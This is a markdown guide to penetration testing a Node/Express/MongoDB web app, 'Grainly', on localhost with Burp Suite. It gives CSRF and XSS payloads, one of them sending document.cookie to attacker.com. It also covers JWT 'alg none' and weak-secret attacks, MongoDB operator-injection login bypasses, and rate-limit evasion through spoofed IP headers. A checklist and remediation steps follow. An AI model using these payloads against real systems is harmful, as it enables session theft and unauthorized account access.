# 🔍 Burp Suite Penetration Testing Guide - Grainly

## 🎯 **Target Application**
- **Backend API**: `http://localhost:5000`
- **Frontend**: `http://localhost:5173`
- **Technology**: Node.js, Express, MongoDB, JWT

## 🚨 **Critical Vulnerabilities to Test**

### **1. CSRF (Cross-Site Request Forgery)**

#### **Testing Methodology**
```http
# State-changing endpoints to test
POST /api/auth/register
POST /api/users/profile
PUT /api/users/profile
POST /api/bookings
POST /api/contact
POST /api/auth/forgot-password
```

#### **Burp Suite Steps**
1. **Proxy → Intercept** requests to these endpoints
2. **Send to Repeater** for manipulation
3. **Remove Authorization headers** and test
4. **Create malicious HTML** forms to test CSRF

#### **CSRF Payload**
```html
<form action="http://localhost:5000/api/users/profile" method="POST">
  <input type="hidden" name="name" value="Hacked User">
  <input type="hidden" name="email" value="hacker@evil.com">
  <input type="submit" value="Click to win!">
</form>
```

### **2. XSS (Cross-Site Scripting)**

#### **Testing Payloads**
```javascript
// Basic XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Advanced XSS
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
```

#### **Target Endpoints**
```http
POST /api/contact
{
  "name": "<script>alert('XSS')</script>",
  "email": "xss@test.com",
  "message": "<img src=x onerror=alert('XSS')>"
}
```

### **3. Authentication Bypass**

#### **JWT Token Manipulation**
```http
GET /api/users/profile
Authorization: Bearer <manipulated_token>
```

#### **Common JWT Attacks**
```javascript
// 1. Algorithm Confusion
// Change "alg": "HS256" to "alg": "none"

// 2. Weak Secret Testing
// Try: "secret", "admin", "password"

// 3. Token Expiry Bypass
// Modify "exp" timestamp to future date
```

### **4. NoSQL Injection**

#### **MongoDB Injection Payloads**
```json
// Login Bypass
{
  "email": {"$ne": null},
  "password": "anything"
}

// User Enumeration
{
  "email": {"$regex": ".*"},
  "password": "anything"
}

// Boolean Injection
{
  "email": "admin@test.com",
  "password": {"$gt": ""}
}
```

### **5. Rate Limiting Bypass**

#### **IP Header Manipulation**
```http
X-Forwarded-For: 192.168.1.1
X-Real-IP: 192.168.1.1
X-Originating-IP: 192.168.1.1
```

## 🔍 **Burp Suite Testing Steps**

### **1. Proxy Configuration**
```
Burp Suite → Proxy → Options
- Add: 127.0.0.1:8080
- Interface: 127.0.0.1
- Port: 8080
```

### **2. Browser Setup**
```
Firefox/Chrome → Network Settings
- HTTP Proxy: 127.0.0.1:8080
- Use proxy for all protocols: ✓
```

### **3. SSL Certificate**
```
Burp Suite → Proxy → Options → Import/Export CA Certificate
- Export and install in browser
```

## 📊 **Testing Checklist**

### **✅ Authentication Testing**
- [ ] JWT token manipulation
- [ ] Authentication bypass attempts
- [ ] Session management testing
- [ ] Multi-factor authentication testing

### **✅ Authorization Testing**
- [ ] Role-based access control
- [ ] Privilege escalation attempts
- [ ] Admin endpoint access
- [ ] User data isolation

### **✅ Input Validation Testing**
- [ ] XSS payload testing
- [ ] NoSQL injection testing
- [ ] Parameter manipulation
- [ ] File upload testing

### **✅ Business Logic Testing**
- [ ] Price manipulation
- [ ] Quantity bypass
- [ ] Order manipulation
- [ ] Payment bypass

## 🚨 **Expected Vulnerabilities**

### **High Priority**
1. **CSRF Protection Missing** - State-changing endpoints vulnerable
2. **HTTPS Not Enforced** - All traffic in plaintext
3. **Advanced XSS Protection** - Limited input sanitization

### **Medium Priority**
1. **Session Management** - No session invalidation
2. **Rate Limiting Bypass** - IP header manipulation
3. **Information Disclosure** - Verbose error messages

### **Low Priority**
1. **Security Headers** - Missing security headers
2. **Logging** - Limited security event logging
3. **Monitoring** - No automated security monitoring

## 🛡️ **Remediation Verification**

### **CSRF Protection**
```http
# Check if CSRF tokens are required
POST /api/users/profile
X-CSRF-Token: <token>
# Without token should return 403
```

### **XSS Protection**
```http
# Test XSS payloads
POST /api/contact
{
  "name": "<script>alert('XSS')</script>",
  "email": "test@test.com",
  "message": "Test"
}
# Check if payload is sanitized
```

### **Rate Limiting**
```http
# Test rate limiting
POST /api/auth/login
# Send multiple requests quickly
# Should get rate limit error after 5 attempts
```

## 📋 **Reporting Template**

### **Vulnerability Report**
```
Issue: [Vulnerability Type]
Severity: [High/Medium/Low]
Description: [Detailed description]
Steps to Reproduce: [Step-by-step]
Impact: [Potential impact]
Remediation: [Fix recommendations]
Evidence: [Screenshots/logs]
```

## 🎯 **Next Steps**

1. **Run Complete Burp Suite Scan**
2. **Document All Findings**
3. **Prioritize Vulnerabilities**
4. **Implement Fixes**
5. **Re-test After Fixes**
6. **Generate Final Report**

---

> **Security Testing Best Practices**
- Always test in controlled environment
- Never test production without authorization
- Document all findings thoroughly
- Prioritize critical vulnerabilities first 